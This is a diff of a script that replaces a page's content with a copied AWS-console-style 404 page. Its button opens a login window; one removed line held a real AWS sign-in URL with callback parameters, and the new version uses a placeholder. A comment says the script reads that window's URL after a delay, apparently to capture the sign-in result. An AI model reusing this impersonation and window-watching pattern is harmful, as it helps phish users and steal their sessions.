@@ -21,7 +21,7 @@
 // }
 // Replace the content of the <html> element
 document.documentElement.innerHTML = `
-<!DOCTYPE html><html lang="en"><head><meta http-equiv="Content-Type"content="text/html; charset=utf-8"/><meta name="viewport"content="width=device-width, initial-scale=1.0"/><title>404 Not found</title><style>
+<!DOCTYPE html><html lang="en"><head><meta http-equiv="Content-Type"content="text/html; charset=utf-8"/><meta name="viewport"content="width=device-width, initial-scale=1.0"/><title>404</title><style>
 
 /*! normalize.css v8.0.1 | MIT License | github.com/necolas/normalize.css */
 html {
@@ -459,15 +459,10 @@ body.awsui-polaris-dark-mode {
     }
 }
 
-</style></head><body class="visual-mode-default">
-
-<main id="errorPage"role="main"class="_typography_g3pvd_383 _root_g3pvd_470"><div class="_padding-vertical-s_g3pvd_417"><svg xmlns="http://www.w3.org/2000/svg"viewBox="0 0 140 91"width="140"height="91"aria-hidden="true"><path d="M122,62a17,17,0,1,0-17-17A17,17,0,0,0,122,62Zm0-17,6.46-6.46L122,45l-6.46-6.46Zm0,0-6.46,6.46L122,45l6.46,6.46Z"fill="none"stroke="#ef6d00"stroke-width="2"></path><path d="M10,12a3,3,0,1,1,3-3A3,3,0,0,1,10,12Zm10,0a3,3,0,1,1,3-3A3,3,0,0,1,20,12Zm10,0a3,3,0,1,1,3-3A3,3,0,0,1,30,12Z"fill="#aab7b8"fill-rule="evenodd"></path><path d="M40,31v9h9V31Zm0,17v9h9V48Zm0,19v9h9V67Z"fill="none"stroke="#aab7b8"stroke-width="2"></path><path d="M123,22V3a2,2,0,0,0-2-2H3A2,2,0,0,0,1,3V88a2,2,0,0,0,2,2H121a2,2,0,0,0,2-2V69.89"fill="none"stroke="#aab7b8"stroke-width="2"></path><rect x="23.46"y="17.04"width="2.06"height="72.7"fill="#aab7b8"></rect><rect x="1.52"y="15.44"width="121.73"height="2.06"fill="#aab7b8"></rect><rect x="55.81"y="34.51"width="44.51"height="1.99"fill="#aab7b8"></rect><rect x="55.86"y="53.5"width="44.51"height="1.99"fill="#aab7b8"></rect><rect x="55.87"y="69.49"width="48.01"height="1.99"fill="#aab7b8"></rect></svg></div><h1>404</h1><div class="_margin-bottom-xs_g3pvd_431"><p>The page you tried was not found.<br/>
-
-<button class="_button_g3pvd_484 _signin-button_g3pvd_466" id="openWindowBtn">Go to Console Home</button></p></div></main>
-<script>
+</style></head><body class="visual-mode-default"><main id="errorPage"role="main"class="_typography_g3pvd_383 _root_g3pvd_470"><div class="_padding-vertical-s_g3pvd_417"><svg xmlns="http://www.w3.org/2000/svg"viewBox="0 0 140 91"width="140"height="91"aria-hidden="true"><path d="M122,62a17,17,0,1,0-17-17A17,17,0,0,0,122,62Zm0-17,6.46-6.46L122,45l-6.46-6.46Zm0,0-6.46,6.46L122,45l6.46,6.46Z"fill="none"stroke="#ef6d00"stroke-width="2"></path><path d="M10,12a3,3,0,1,1,3-3A3,3,0,0,1,10,12Zm10,0a3,3,0,1,1,3-3A3,3,0,0,1,20,12Zm10,0a3,3,0,1,1,3-3A3,3,0,0,1,30,12Z"fill="#aab7b8"fill-rule="evenodd"></path><path d="M40,31v9h9V31Zm0,17v9h9V48Zm0,19v9h9V67Z"fill="none"stroke="#aab7b8"stroke-width="2"></path><path d="M123,22V3a2,2,0,0,0-2-2H3A2,2,0,0,0,1,3V88a2,2,0,0,0,2,2H121a2,2,0,0,0,2-2V69.89"fill="none"stroke="#aab7b8"stroke-width="2"></path><rect x="23.46"y="17.04"width="2.06"height="72.7"fill="#aab7b8"></rect><rect x="1.52"y="15.44"width="121.73"height="2.06"fill="#aab7b8"></rect><rect x="55.81"y="34.51"width="44.51"height="1.99"fill="#aab7b8"></rect><rect x="55.86"y="53.5"width="44.51"height="1.99"fill="#aab7b8"></rect><rect x="55.87"y="69.49"width="48.01"height="1.99"fill="#aab7b8"></rect></svg></div><h1>404</h1><div class="_margin-bottom-xs_g3pvd_431"><p>The page you tried was not found.<br/><button id="openWindowBtn" class="_button_g3pvd_484 _signin-button_g3pvd_466">Home</button></p></div></main></body><script>
     document.getElementById('openWindowBtn').addEventListener('click', function() {
         // Open a new window (you can provide the URL of the page you want to open here)
-        let newWindow = window.open("https://eu-central-1.console.aws.amazon.com/cke/auth?region=eu-central-1&redirectUrl=https%3A%2Frepost.aws%2Fapi%2Fv1%2Fidentity%2Faws%2Fcallback%3Fstate%3DeyJub25jZSI6IlAtQklYdy0wUWItZzVEdWlLcUYtTkEifQ&challenge=RLg39KeRa_bRpOImvYOGk7c20XpoFrPq0QCM8wRtOlg", "_blank");
+        let newWindow = window.open("https://your-url-here.com", "_blank");
 
         if (newWindow) {
             // Wait for 5 seconds before accessing the URL of the new window
@@ -486,6 +481,5 @@ body.awsui-polaris-dark-mode {
         }
     });
 </script>
-
-</body></html>
+</html>
 `;
